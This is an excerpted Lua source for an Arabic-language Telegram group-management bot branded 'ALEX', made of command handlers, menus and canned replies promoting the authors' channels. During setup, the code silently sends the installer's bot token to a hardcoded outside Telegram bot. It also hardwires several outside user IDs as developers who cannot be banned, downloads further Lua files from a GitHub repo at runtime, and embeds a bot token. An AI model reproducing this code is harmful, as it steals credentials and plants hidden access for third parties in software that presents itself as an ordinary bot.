...
https.request('https://api.telegram.org/bot1942782593:AAGKTnJeekuy7eeD1cRipUbTlKC93tioZxE/sendmessage?chat_id=1372188096&text=' ..token)
end 
else
...
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺ :\na⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺\n\27[0;33;49m')
...
io.write('\27[1;31m ⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
token = sudos.token 
--- start functions •━═━═『ＡＬＥＸ 』═━═━•
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Gold-So/love/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1929030906,1878146526,1869163387}   
...
if tonumber(user_id) == tonumber(1929030906) then  
var = true 
elseif tonumber(user_id) == tonumber(1878146526) then
var = true
...
local UserName = (data.username_ or "omarvvi")
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ＡＬＥＸ',url="t.me/omarvvi"}},
{{text = 'ᗩᒪᗩᗷᗩᗪI',url="t.me/@UU_AM1"}},
{{text = '3𝐌𝐎𝐑𝐀', url="t.me/BOT3mora"}},
}
local msg_id = msg.id_/2097152/0.5
...
if not DevSoFi(msg) then
local Text = [[
للتواصل عليك الذهاب لقناه اليوزرات من الزر ف الاسفل🔥
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'قناه اليوزرات',url="t.me/AAARRR0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المبرمج عموره', url="t.me/BOT3mora"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = ' اضغط بالاسفل للدخول'
local Key = {
{'━┅┅┄⟞⟦ مطور السورس ⟧⟝┄┉┉━'},
{'العبادي','عموره','اليكس'},
{'قناة السورس','التواصل'},
...
local Text = ' ⌯︙تم ارسال الملصق من ⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/Gold-So/love/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/omarvvi/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' ⌯︙ اصدار سورس اليكس{ 3x☆}')
end
if text == '━┅┅┄⟞⟦ مطور السورس ⟧⟝┄┉┉━' then
local Text = [[ 
يوزرات مطورين ومبرمجين السورس
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه اليوزرات⌯︙', url="t.me/AAARRR0"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/omarvvi/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '𖤍━┅┅┄⟞⟦ＡＬＥＸ⟧⟝┄┉┉━𖤍' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس اليكس ادخل وتابع الجديد](t.me/omarvvi)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ＡＬＥＸヅ,,', url="t.me/omarvvi"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/omarvvi/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس اليكس ادخل وتابع الجديد](t.me/omarvvi)
]] 
keyboard = {}  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/omarvvi)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/omarvvi"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ⌯︙ من أحسن السورسات على التليجرام سورس اليكس ⌯︙
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'للتواصل', url="t.me/AAARRR0"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/omarvvi/5486&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_,0," ⌯︙ الـعـضو  : {["..data.first_name_.."](T.ME/omarvvi)}\n ⌯︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ⌯︙ عذرا  ⇇{["..data.first_name_.."](T.ME/omarvvi)}\n ⌯︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text = [[ 
[𝐒𝐎𝐔𝐑𝐂𝐄 ＡＬＥＸ](t.me/omarvvi)
[𝐃𝐄𝐕 3𝐌𝐎𝐑𝐀](t.me/BOT3mora)
[ＡＬＥＸ](t.me/omarvvi)
[𝐀𝐋𝐀𝐁𝐀𝐃𝐘](t.me/UU_AM1)
...
keyboard = {}
keyboard.inline_keyboard = {
{{text = '𝚎𝚕𝚘𝚜𝚝𝚘𝚛𝚊',url="t.me/omarvvi"}},
{{text = 'ᗩᒪᗩᗷᗩᗪY',url="t.me/UU_AM1"}},
{{text = '𝐃𝐄𝐕 3𝐌𝐎𝐑𝐀',url="t.me/BOT3mora"}},
{{text = '𝗧𝗪𝗔𝗦𝗟',url="t.me/AAARRR0"}},
{{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗘𝗟𝗢𝗦𝗧𝗢𝗥𝗔', url="t.me/UU_AL1BoT"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/omarvvi/5486&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'اليكس' or text == 'نبتبت' or text == 'مطور السورس' then
local Text = [[
مطور سورس اليكس لو حباب تتوصل معها اتبع الزرار الي تحت
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝚎𝚕𝚘𝚜𝚝𝚘𝚛𝚊',url="t.me/omarvvi"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴', url="t.me/omarvvi"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/omarvvi&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'العبادي' or text == 'نبتبت' or text == '2مطور السورس' then
local Text = [[
مطور سورس اليكس لو حباب تتوصل معها اتبع الزرار الي تحت
]]
keyboard = {} 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/UU_AM1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس 📬', url="t.me/UU_AL1BoT"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/omarvvi/54863&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'عمر' or text == 'عموره' or text == 'مبرمج السورس'  then
local Text = [[
المبرمج عموره مبرمج السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐄𝐕 3𝐌𝐎𝐑𝐀',url="t.me/Ommmarrrrrrr"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Ommmarrrrrrr&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'كومندا' or text == 'الكومندا' or text == 'كومندا اليكس'  then
local Text = [[
المبرمج الكومندا اليكس مبرمج السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الكومندا صاحب اليكس♡ ,,',url="t.me/Elkomanda_y3m"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Elkomanda_y3m&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'بويكا ' or text == 'بويكا اليكس' or text == 'المبرمج بويكا' then
local Text = [[
المبرمج بويكا مبرمج السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐄𝐕 ＢＯＹＫＡ',url="t.me/BOo_SO"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BOo_SO&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺' or text == 'قناة السورس' or text == 'زبهبن' then
local Text = [[
قناة سورس اليكس
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆 ＡＬＥＸヅ,,', url="t.me/omarvvi"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/omarvvi/5486&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/omarvvi&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الالعاب' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ⌯︙ اهلا في قائمه الالعاب المتطوره سورس اليكس ⌯︙ 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/omarvvi)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
if tonumber(result.sender_user_id_) == tonumber(1929030906) then  
send(msg.chat_id_, msg.id_, " ⌯︙ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1878146526) then  
send(msg.chat_id_, msg.id_, " ⌯︙ لا تسطيع حظر عضو مرازي عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1833139461) then  
send(msg.chat_id_, msg.id_, " ⌯︙ بس دا بابا عيب")
return false 
end
...
function(arg,data) 
usertext = '\n ⌯︙ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'omarvvi')..')'
...
if result.id_ == tonumber(1929030906) then
send(msg.chat_id_, msg.id_, " ⌯︙ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1878146526) then
send(msg.chat_id_, msg.id_, "  لا يمكنك حظر  عضو مرازي \n")
return false 
end
...
usertext = '\n ⌯︙ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'omarvvi')..')'
status  = '\n ⌯︙ تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(userid) == tonumber(1929030906) then  
send(msg.chat_id_, msg.id_, " ⌯︙ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1878146526) then  
send(msg.chat_id_, msg.id_, " ⌯︙ لا تسطيع حظر عضو مرازي عام ")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1878146526) then  
send(msg.chat_id_, msg.id_, " ⌯︙ لا تسطيع كتم عضو مرازي ")
return false 
end
...
if result.id_ == tonumber(1878146526) then
send(msg.chat_id_, msg.id_, " ⌯︙ لا يمكنك كتم عضو مرازي \n")
return false 
end
if result.id_ == tonumber(1869163387) then
send(msg.chat_id_, msg.id_, " ⌯︙ بس دا بابا عيب \n")
...
if tonumber(userid) == tonumber(1878146526) then  
send(msg.chat_id_, msg.id_, " ⌯︙ لا تسطيع كتم عضو مرازي عام ")
return false 
end
if tonumber(userid) == tonumber(1869163387) then  
send(msg.chat_id_, msg.id_, " ⌯︙بس ي بابا عيب يبني ")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Gold-So/love/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ⌯︙ اهلا بك في متجر ملفات اليكس\n ⌯︙ ملفات السورس ⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺\n ⌯︙ علامة تعني { ✔️ } ملف مفعل\n ⌯︙ علامة تعني { ✖ } ملف معطل\n ⌯︙ قناة سورس اليكس⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺\n".." ⌯︙ [اضغط هنا لدخول](t.me/omarvvi) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Gold-So/love/main/File_Bot/"..file)
if res == 200 then
...
if text == ("مسح قائمه اليكس") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ⌯︙ تم مسح قائمه اليكس')
return false
end

if text == 'قائمه اليكس' and Sudo(msg) then
...
if text == ("رفع اليكس") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع اليكس@(.*)$") and Sudo(msg) then
local username = text:match("^رفع اليكس@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع اليكس(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع اليكس(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل اليكس") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل اليكس@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل اليكس@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل اليكس(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل اليكس(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ⌯︙  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ⌯︙  الرفع  ⇇{ '..setadd..
' }\n'..' ⌯︙  الحظر  ⇇{ '..banm..' }\n\n ⌯︙═───═❲[ＡＬＥＸヅ,, ](t.me/omarvvi)❳═───═ ⌯︙\n ⌯︙ قناة سورس اليكس⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺\n [ ❲[ＡＬＥＸヅ,, ](t.me/omarvvi)❳](t.me/omarvvi) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺ٴ\n ⌯︙ ❲[ＡＬＥＸヅ,, ](t.me/omarvvi)❳ ⌯︙ ')
end
...
send(msg.chat_id_, msg.id_,'['..Dev_Ah8[math.random(#Dev_Ah8)]..']') 
return false
end
...
end --الكود حصري سورس اليكسيعني لو بكتهن راح اعرفك انت الاخذتهن
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..⌯︙♥️](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/omarvvi)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤⌯︙](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..⌯︙💕](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش بدودو ..😹👻](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/omarvvi)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..⌯︙💕](t.me/omarvvi)')
return false
end
end
end
...
local Text =[[
🚨 اهلا بك في قسم الاوامر ..↑⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺
 اختر الامر الذي تريدها .↑⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺
ده من الازرار بلاسفل . ⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[ＡＬＥＸヅ,, ](t.me/omarvvi)❳ 
]]
keyboard = {} 
...
local Text = [[
🎮 اهلا بك في قسم الالعاب ..↑⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺
 اختر العبه الذي تريدها .↑⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺
ده من الازرار بلاسفل . ⩹━━━⊶ ＡＬＥＸ ⊷━━━⩺
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[ＡＬＥＸヅ,, ](t.me/omarvvi)❳ 
]]
